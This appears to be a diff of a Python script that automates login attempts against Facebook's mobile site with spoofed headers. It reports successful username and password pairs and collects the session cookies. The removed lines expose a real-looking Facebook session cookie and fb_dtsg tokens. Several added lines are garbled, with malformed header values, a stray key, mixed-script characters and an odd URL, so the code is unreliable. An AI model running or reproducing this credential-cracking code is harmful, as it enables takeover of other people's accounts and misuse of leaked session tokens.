@@ -199,27 +199,43 @@ class __xxx__:
                         "sec-fetch-site": 'same-origin',
                         "upgrade-insecure-requests": '1',
                         "user-agent": 'ua',}
-                header3={"authority": 'mobile.facebook.com',
-                        "method": 'POST',
-"path": '/ajax/mtouch_perf_page_load_timings/?lid=7180610632952233514&seq_num=1&event=prelude_onload&client_event_time=1671866223.358&time_from_nav_start_ms=549&jazoest=25671&previous_event=nav_started&log_to_scuba=false&page_path=%2Fwap%2Fhome.php&fb_dtsg=NAcPpjm_uN8jiIXxEIyUsMLjD-gXfrqLk-LXDWOA0wDjm-fQenPcbxg%3A24%3A1671772839&num_cores=2&ram_gb=2&downlink_mb=1.5&effective_connection_type=3g&rtt_ms=350&transmission_method=beacon',
-                        "scheme": 'https',
-                        "accept": '*/*',
-                        "accept-encoding": 'gzip, deflate, br',
-                        "accept-language": 'en-US,en;q=0.9',
-                        "content-length": '0',
-                        
-                        "cookie": 'datr=hWZ_Y7FDRH1BF2Re6P8U_0HZ; sb=hWZ_Y9YF7UnwDW2O2KmHPEJB; c_user=100011092841985; xs=24%3A6hyJzZBHRc2W1Q%3A2%3A1671772839%3A-1%3A6025%3A%3AAcW_LV7bbUUzTR7u1yFV8uS74IDgxJF5zpfcWa9jlA; fr=0tmW4MnMVCUmgM9dd.AWX_45bFD9xH-Tpf-5RoAwmv8jA.BjpqN1.uB.AAA.0.0.BjpqOh.AWVmsnA2jHw; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671865291796%2C%22v%22%3A1%7D; m_page_voice=100011092841985; m_pixel_ratio=1; wd=1024x768',
+                header3={"authority": 'm.facebook.com',
 
-                        "origin": 'https://mobile.facebook.com',
-                        "referer": 'https://mobile.facebook.com/?_rdc=1&_rdr&tbua=1',
-                        "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+                        "method": 'POST',
+
+"path": '/ajax/mtouch_perf_page_load_timings/?lid=7180610632952233514&seq_num=1&event=prelude_onload&client_event_time=1671866223.358&time_from_nav_start_ms=549&jazoest=25671&previous_event=nav_started&log_to_scuba=false&page_path=%2Fwap%2Fhome.php&fb_dtsg=NAcPpjm_uN8jiIXxEIyUsMLjD-gXfrqLk-LXDWOA0wDjm-fQenPcbxg%3A24%3A1671772839&num_cores=2&ram_gb=2&downlink_mb=1.5&effective_connection_type=3g&rtt_ms=350&transmission_method=beacon',
+                        
+
+                        "scheme": 'https',
+
+                        "accept": '*/*',
+
+                        "accept-encoding": 'gzip, deflate, br',
+
+                        "accept-language": 'en-US, en -0.9',
+
+                        "content-length": '1203',
+
+                        "content-type": 'multipart/form-data; boundary-WebKit FormBoundary TheB48886jv80', 
+                        "cookie": 'dat=DbCGYyO2FJ7UIA; b-DbCGY_HBsPsL30agnuk.clama vpdev138668x360x2 locale=en_US; m_pixel_ratio',
+"2": 'fr-009d5 Turku7f1:00. AMETyto 7H20228.BjhrAN. 37.AAA.0.0.BytьAS.AWI-HQUIVE: wd-380x1818', 
+                        "origin": 'https://m.facebook.com',
+
+                        "referer": 'https://m.facebook.com/login/?next&ruf-th2&1&login_from_ah=1&ref=s',
+
+                        "sec-ch-ua": '"Chromium";y="107", "Not-A7Brand";="24"',
+
                         "sec-ch-ua-mobile": '?0',
-                        "sec-ch-ua-platform": '"Windows"',
+
+                        "sec-ch-ua-platform": '"Linux"',
+                        
                         "sec-fetch-dest": 'empty',
-                        "sec-fetch-mode": 'no-cors',
+                        
+                        "sec-fetch-mode": 'cors',
+
                         "sec-fetch-site": 'same-origin',
-                        "user-agent": 'ua',}                                          
-                po = session.post(f"https://mobile.facebook.com/?_rdc=1&_rdr&tbua=1", data = das, headers = header1, allow_redirects = False)
+                        "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.3',}                                          
+                po = session.post("https://m.facebook.com/a/hz?fb_dtsg=Ac08FgwCQv9z12302jRne_ToX-c_t_ReqFqYZ:0:0&#20", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     print(f"\r{H} [SSB-OK] {user} | {pw}")
